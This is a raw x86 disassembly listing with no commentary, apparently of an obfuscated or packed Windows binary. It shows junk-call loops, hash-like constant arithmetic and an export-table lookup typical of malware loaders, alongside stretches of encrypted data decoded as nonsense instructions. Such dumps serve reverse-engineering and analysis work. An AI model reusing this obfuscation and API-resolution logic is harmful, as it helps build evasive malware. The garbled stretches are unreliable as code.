  407e12:	mov    bh,0xd
  407e14:	das    
  407e15:	jle    0x407e0e
  407e17:	push   0xffffffdb
  407e19:	dec    eax
  407e1a:	ja     0x407e09
  407e1c:	ret    
  407e1d:	jle    0x407e0d
  407e1f:	nop
  407e20:	sbb    BYTE PTR [eax-0x6542026e],0x14
  407e27:	xchg   ecx,eax
  407e28:	cmp    ebp,edi
  407e2a:	mov    ds:0x2cf80ea8,eax
  407e2f:	push   ss
  407e30:	xchg   edi,eax
  407e31:	mov    bh,0x20
  407e33:	cmp    eax,DWORD PTR [edi+0x392184ef]
  407e39:	clc    
  407e3a:	arpl   bx,ax
  407e3c:	adc    DWORD PTR [ebx-0xd],0xd8c206e
  407e43:	fs scas eax,DWORD PTR es:[edi]
  407e45:	cli    
  407e46:	fsubr  st,st(5)
  407e48:	and    bl,BYTE PTR [esi]
  407e4a:	jmp    0xdbef699
  407e4f:	ins    DWORD PTR es:[edi],dx
  407e50:	sbb    BYTE PTR [ecx],bh
  407e52:	mov    ch,0x7e
  407e54:	int    0x2b
  407e56:	(bad)
  407e59:	in     eax,0x69
  407e5b:	popf   
  407e5c:	cmp    esi,ebp
  407e5e:	push   edi
  407e5f:	xchg   edi,eax
  407e60:	inc    DWORD PTR [esi+eax*4+0x35]
  407e64:	or     al,0x4d
  407e66:	mov    DWORD PTR [ebp+0x53e1c34f],esi
  407e6c:	lds    ebp,FWORD PTR [ebx]
  407e6e:	ret    
  407e6f:	fwait
  407e70:	sbb    al,0x2c
  407e72:	mov    BYTE PTR [eax],ch
  407e74:	inc    esp
  407e75:	call   0xb64:0x76000b0c
  407e7c:	mov    ecx,0x99759ca
  407e81:	mov    ah,0xf5
  407e83:	lahf   
  407e84:	stc    
  407e85:	dec    edi
  407e86:	ret    
  407e87:	cmp    ebx,DWORD PTR [esi+0x5830ed46]
  407e8d:	lea    ecx,ds:0x99b793e1
  407e93:	jmp    0x407edb
  407e95:	fist   WORD PTR [edi]
  407e97:	hlt    
  407e98:	hlt    
  407e99:	push   0x484ad845
  407e9e:	lahf   
  407e9f:	xor    eax,0x96bd6631
  407ea4:	push   edx
  407ea5:	mov    al,ds:0x73d6c1e1
  407eaa:	cmp    bl,bl
  407eac:	or     edi,ebp
  407eae:	cs jg  0x407eaa
  407eb1:	mov    eax,ds:0x69a02943
  407eb6:	xor    DWORD PTR [eax],0x2650fa8f
  407ebc:	jmp    0x407c05
  407ec1:	mov    ax,WORD PTR [ebp-0x4]
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [ebp-0x22cfedb4],ecx
  407efe:	enter  0x7c7c,0x6
  407f02:	jg     0x407f80
  407f04:	jl     0x407e97
  407f06:	xor    eax,0x49b49f60
  407f0b:	sahf   
  407f0c:	stos   BYTE PTR es:[edi],al
  407f0d:	pop    ss
  407f0e:	dec    ecx
  407f0f:	(bad)  
  407f10:	jns    0x407eaf
  407f12:	das    
  407f13:	sbb    al,bl
  407f15:	int    0x7f
  407f17:	(bad)
  407f1a:	adc    esi,DWORD PTR [ebx]
  407f1c:	mov    dh,0x89
  407f1e:	addr16 adc eax,0xb1ad8319
  407f24:	sbb    eax,0x3b18bf20
  407f29:	mov    ds:0xf03ef6e6,al
  407f2e:	in     eax,dx
  407f2f:	mov    esi,eax
  407f31:	(bad)  [ecx+0x396ee537]
  407f37:	jnp    0x407f80
  407f39:	sahf   
  407f3a:	jle    0x407f7d
  407f3c:	adc    eax,0x32271f00
  407f41:	scas   al,BYTE PTR es:[edi]
  407f42:	(bad)  
  407f43:	(bad)  
  407f44:	pushf  
  407f45:	cmp    BYTE PTR [edi+ebp*4-0x2dffcf76],dh
  407f4c:	cli    
  407f4d:	(bad)  
  407f4e:	adc    eax,edi
  407f50:	mov    al,ds:0x8fa35285
  407f55:	push   ebp
  407f56:	jbe    0x407f7d
  407f58:	mov    cl,0xdc
  407f5a:	or     DWORD PTR [ebp+0x2198a8e0],ecx
  407f60:	and    bl,cl
  407f62:	xor    BYTE PTR [edi],dl
  407f64:	mov    esi,0x6bf3cc25
  407f69:	pop    edi
  407f6a:	addr16 movaps xmm2,xmm7
  407f6e:	push   esi
  407f6f:	ret    0x48a0
  407f72:	(bad)  
  407f73:	push   eax
  407f74:	outs   dx,DWORD PTR ds:[esi]
  407f75:	ja     0x407f99
  407f77:	inc    ecx
  407f78:	pop    ebp
  407f79:	mov    esp,0xc5deeebe
  407f7e:	push   ecx
  407f7f:	cwde   
  407f80:	xor    DWORD PTR [eax+0x7d],0x1cb4e51b
  407f87:	rcl    ecx,1
  407f89:	enter  0xc7e3,0x26
  407f8d:	stos   BYTE PTR es:[edi],al
  407f8e:	lods   al,BYTE PTR ds:[esi]
  407f8f:	xor    cl,bl
  407f91:	jmp    0x8009:0x1caf746
  407f98:	jge    0x407fff
  407f9a:	retf   
  407f9b:	sbb    al,0x8e
  407f9d:	sub    al,0x35
  407f9f:	loope  0x407f6b
  407fa1:	jne    0x407f73
  407fa3:	xor    DWORD PTR [eax+0x3c],ebp
  407fa6:	ror    BYTE PTR [ebx-0x5c],1
  407fa9:	pop    ebp
  407faa:	pop    ebp
  407fab:	fstp   TBYTE PTR [esi-0x7d6335a5]
  407fb1:	xchg   ecx,eax
  407fb2:	div    BYTE PTR [edi-0x77]
  407fb5:	pusha  
  407fb6:	lock xchg DWORD PTR [ecx+0x14],edx
  407fba:	popf   
  407fbb:	push   esp
  407fbd:	push   ds
  407fbe:	ss cli 
  407fc0:	(bad)  
  407fc1:	sbb    BYTE PTR [eax],cl
  407fc3:	arpl   WORD PTR [ecx-0x6e631b39],ax
  407fc9:	lock jae 0x408020
  407fcc:	mov    esp,0x2fb76703
  407fd1:	sub    al,0x56
  407fd3:	ds mov ebp,0xd5ce75a1
  407fd9:	mov    bh,0xf0
  407fdb:	cmc    
  407fdc:	test   eax,0x6c0a2b28
  407fe1:	cli    
  407fe2:	test   BYTE PTR [ecx+0x73ee75a4],bh
  407fe8:	pop    es
  407fe9:	cs sahf 
  407feb:	mul    dl
  407fed:	cmp    al,0x8d
  407fef:	fdiv   DWORD PTR [ebx+0x21]
  407ff2:	jge    0x407f9d
  407ff4:	cdq    
  407ff5:	sbb    BYTE PTR [edi+edi*8+0x54],0x32
  407ffa:	call   0x9b885e1c
  407fff:	xor    bl,BYTE PTR [edx-0x27]
  408002:	repnz and bh,BYTE PTR [ebp+0x159d8fb1]
  408009:	addr16 aaa 
  40800b:	pop    edi
  40800c:	sub    BYTE PTR [esi-0x7a],dl
  40800f:	push   edx
  408010:	lds    esi,FWORD PTR [ebx+ebp*2-0x78]
  408014:	icebp  
  408015:	pop    ebx
  408016:	sub    BYTE PTR [ecx+0xa5096f5],ah
  40801c:	dec    esi
  40801d:	mov    ds:0x89c60383,eax
  408022:	inc    ebp
  408023:	fmul   QWORD PTR [ebx-0x749927bb]
  408029:	jge    0x407fff
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x44d420
  4080ba:	sbb    ecx,DWORD PTR ds:0x410753
  4080c0:	mov    DWORD PTR ds:0x44d420,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x410753
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x44a6cc,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x424736,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x44d410,0x0
  408100:	mov    ecx,DWORD PTR ds:0x44d410
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x44d410,ecx
  40810d:	cmp    DWORD PTR ds:0x44d410,0x1b
  408114:	jne    0x408125
  40811a:	push   0x410845
  40811f:	call   DWORD PTR ds:0x442378
  408125:	cmp    DWORD PTR ds:0x44d410,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	adc    BYTE PTR [ebp-0x3418d863],al
  408150:	jl     0x4081ce
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	sbb    BYTE PTR ss:[edi+0x37],bh
  40815a:	jbe    0x408113
  40815c:	push   edx
  40815d:	dec    ebp
  40815e:	popa   
  40815f:	shl    DWORD PTR [ebp+0x55a1bab7],0x64
  408166:	cmp    edx,DWORD PTR [ecx]
  408168:	xchg   esp,eax
  408169:	aas    
  40816a:	xor    BYTE PTR ds:[ebx+0x79],0xf5
  40816f:	in     al,dx
  408170:	dec    edi
  408171:	fstp   st(1)
  408173:	sbb    ebp,esi
  408175:	jno    0x40812a
  408177:	push   ecx
  408178:	push   ebx
  408179:	inc    ecx
  40817a:	enter  0xc7e0,0x62
  40817e:	mov    dl,0x42
  408180:	in     eax,0xca
  408182:	daa    
  408183:	stc    
  408184:	in     eax,dx
  408185:	inc    ebx
  408186:	popa   
  408187:	fs add eax,0x62faf79
  40818d:	sub    ah,dh
  40818f:	loopne 0x408179
  408191:	add    al,0xdb
  408193:	mov    ecx,fs
  408195:	test   edx,esi
  408197:	inc    edx
  408198:	lea    esi,[esi]
  40819a:	les    esp,FWORD PTR [ebp+0x70da1122]
  4081a0:	ins    DWORD PTR es:[edi],dx
  4081a1:	jp     0x408186
  4081a3:	sub    edx,esi
  4081a5:	test   edx,edx
  4081a7:	scas   al,BYTE PTR es:[edi]
  4081a8:	cmp    eax,0xe23c4e28
  4081ad:	add    esi,DWORD PTR [edi]
  4081af:	push   ecx
  4081b0:	jge    0x4081b1
  4081b2:	push   ebx
  4081b3:	and    al,BYTE PTR [eax]
  4081b5:	aad    0x60
  4081b7:	(bad)  
  4081b8:	hlt    
  4081b9:	mov    edi,0xb54832b3
  4081be:	mov    DWORD PTR [edx+0xb],esp
  4081c1:	push   esp
  4081c2:	push   eax
  4081c3:	dec    ebp
  4081c4:	inc    ecx
  4081c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c6:	inc    esi
  4081c7:	jp     0x4081ee
  4081c9:	test   BYTE PTR [eax+ebp*8-0x47],0x9d
  4081ce:	inc    ecx
  4081cf:	dec    esp
  4081d0:	and    eax,0xb5abb671
  4081d5:	pop    ecx
  4081d6:	repz int3 
  4081d8:	mov    al,ds:0xceef8c29
  4081dd:	adc    cl,dh
  4081df:	in     al,dx
  4081e0:	sub    al,BYTE PTR [ebp-0x50f03efd]
  4081e6:	(bad)  
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x44a6d0,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x44a6d4,0x1c
  408206:	cmp    DWORD PTR ds:0x44a6d4,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x44a6d4,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x44201c
  408229:	cmp    DWORD PTR ds:0x44a6d4,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x44a6d4
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x44a6d4,esi
  408243:	mov    esi,DWORD PTR ds:0x44a6d4
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x44a6d4,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x4082e6
  408290:	int3   
  408291:	jo     0x408223
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	jp     0x40823e
  40829d:	mov    cs,esp
  40829f:	mov    ebx,0xacb2f259
  4082a4:	(bad)  
  4082a5:	jb     0x408253
  4082a7:	(bad)  
  4082a9:	pop    ecx
  4082aa:	shr    BYTE PTR [esi+0x1da1ba82],1
  4082b0:	das    
  4082b1:	xchg   ecx,eax
  4082b2:	dec    eax
  4082b3:	shl    DWORD PTR [eax],cl
  4082b5:	lahf   
  4082b6:	dec    esi
  4082b7:	cmp    al,0x88
  4082b9:	mov    ebp,DWORD PTR [edi+0x2e6d1deb]
  4082bf:	push   ecx
  4082c0:	mov    edi,0xb7a10dcc
  4082c5:	std    
  4082c6:	mov    al,0x6b
  4082c8:	cdq    
  4082c9:	or     BYTE PTR [ebp+0x29],dl
  4082cc:	aaa    
  4082cd:	fwait
  4082ce:	ins    DWORD PTR es:[edi],dx
  4082cf:	cmp    al,0xbd
  4082d1:	push   esp
  4082d2:	pop    esp
  4082d3:	inc    esi
  4082d4:	inc    eax
  4082d5:	int    0xfa
  4082d7:	mov    cl,0xc8
  4082d9:	sahf   
  4082da:	mov    bl,0xb6
  4082dc:	aaa    
  4082dd:	stos   DWORD PTR es:[edi],eax
  4082de:	mov    edx,0x19729f3a
  4082e3:	ins    BYTE PTR es:[edi],dx
  4082e4:	adc    DWORD PTR [edx],esp
  4082e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e7:	popa   
  4082e8:	pushf  
  4082e9:	mov    esi,0x7141f657
  4082ee:	outs   dx,BYTE PTR ds:[esi]
  4082ef:	stos   DWORD PTR es:[edi],eax
  4082f0:	xchg   ebp,eax
  4082f1:	retf   
  4082f2:	cmp    al,0x50
  4082f4:	xchg   DWORD PTR [eax-0x35],eax
  4082f7:	sub    ch,BYTE PTR [esi-0x7a22e992]
  4082fd:	dec    eax
  4082fe:	xor    eax,0x8511ace2
  408303:	or     al,0x97
  408305:	or     al,BYTE PTR [eax]
  408307:	popf   
  408308:	jae    0x4082cb
  40830a:	sbb    ch,BYTE PTR [esi+0x29]
  40830d:	stos   BYTE PTR es:[edi],al
  40830e:	xchg   BYTE PTR [ecx-0x5c5cac86],al
  408314:	xchg   DWORD PTR [esp+esi*4+0x3f],ebx
  408318:	mov    dl,0xc0
  40831a:	dec    edx
  40831b:	fisub  WORD PTR [esi]
  40831d:	dec    esi
  40831e:	int3   
  40831f:	push   edi
  408320:	fcomp  QWORD PTR [esi+0x7e719391]
  408326:	mov    BYTE PTR [ebx],0xc1
  408329:	add    esi,ecx
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x4442b8
  408362:	xor    DWORD PTR ds:0x44d418,0x56f9
  40836c:	call   DWORD PTR ds:0x4420a0
  408372:	adc    DWORD PTR ds:0x447980,0x424742
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x447984,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x44a6e4,0x447990
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x44a6dc,0x44799c
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x424742,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x424742
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x424742,esi
  4083c6:	cmp    DWORD PTR ds:0x424742,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x424742,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x44237c
  4083eb:	cmp    DWORD PTR ds:0x424742,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x424742
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x424742,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x44a6e0,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x447990,0x1efc
  408423:	push   esi
  408424:	push   0x4442fc
  408429:	push   0x444324
  40842e:	call   DWORD PTR ds:0x442370
  408434:	mov    DWORD PTR ds:0x44d424,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x447980,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x42473a,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x41074f,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x44799c,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x410743,0x424742
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x442368
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44d424,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x4479a0
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x4479a4,0x12
  4084e4:	cmp    DWORD PTR ds:0x4479a4,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x4479a4,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x442380
  408509:	cmp    DWORD PTR ds:0x4479a4,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x4479a4
  40851b:	dec    eax
  40851c:	mov    ds:0x4479a4,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x4479a4
  408529:	dec    eax
  40852a:	mov    ds:0x4479a4,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x44d418
  40853a:	mov    eax,ds:0x4441a0
  40853f:	and    DWORD PTR ds:0x44d414,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44d414
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44d414,esi
  40855b:	cmp    DWORD PTR ds:0x44d414,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44d414,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x442384
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x44a6e0
  408596:	sbb    edx,DWORD PTR ds:0x42473e
  40859c:	mov    DWORD PTR ds:0x44a6e0,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x44d428,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44d414,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44d414
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44d414,esi
  4085d2:	cmp    DWORD PTR ds:0x44d414,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41098d
  4085eb:	call   DWORD PTR ds:0x442388
  4085f1:	cmp    DWORD PTR ds:0x44d414,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x44a6d4,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x44a6d4
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x44a6d4,esi
  408617:	cmp    DWORD PTR ds:0x44a6d4,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x4420ec
  40862f:	cmp    DWORD PTR ds:0x44a6d4,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x44a6d4
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x44a6d4,esi
  408649:	cmp    DWORD PTR ds:0x44a6d4,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x4479a0,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x447990
  408668:	sub    esi,DWORD PTR ds:0x42473a
  40866e:	mov    DWORD PTR ds:0x447990,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x42473a,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x44d40c,0x44a6e8
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x447990,0x1b
  40869a:	cmp    DWORD PTR ds:0x447990,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x447990,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x4420f0
  4086c9:	cmp    DWORD PTR ds:0x447990,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x447990
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x447990,edi
  4086e3:	mov    edi,DWORD PTR ds:0x447990
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x447990,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x44d428,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x44d428
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x44d428,edi
  40870c:	cmp    DWORD PTR ds:0x44d428,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x44238c
  408729:	cmp    DWORD PTR ds:0x44d428,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x44d428
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x44d428,edi
  408743:	cmp    DWORD PTR ds:0x44d428,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44d424,0x410753
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x44a6cc
  40876a:	mov    eax,ds:0x44441c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x424732,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x44a6e4,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x44a6cc
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x447994,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x447994
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x447994,edx
  4087c6:	cmp    DWORD PTR ds:0x447994,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41098d
  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x442390
  4087eb:	cmp    DWORD PTR ds:0x447994,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x4442b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x44a6e4
  40880c:	sub    edx,DWORD PTR ds:0x44798c
  408812:	mov    DWORD PTR ds:0x44a6e4,edx
  408818:	mov    ds:0x44441c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x41074b,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x4442b0
  408830:	sbb    DWORD PTR ds:0x44799c,0x44a6e8
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x44a6d4,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x44a6e0,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x4444e0
  40886a:	mov    ebx,DWORD PTR ds:0x4444ec
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x4441a0
  408880:	and    DWORD PTR ds:0x4479a4,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x4479a4
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x4479a4,ebx
  408897:	cmp    DWORD PTR ds:0x4479a4,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x4420f4
  4088b5:	cmp    DWORD PTR ds:0x4479a4,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x44a6e8,0x1c
  4088cc:	cmp    DWORD PTR ds:0x44a6e8,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x44a6e8,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x4420f8
  4088ef:	cmp    DWORD PTR ds:0x44a6e8,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
  4088fe:	xor    edx,DWORD PTR ds:0x44a6e8
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x44a6e8,edx
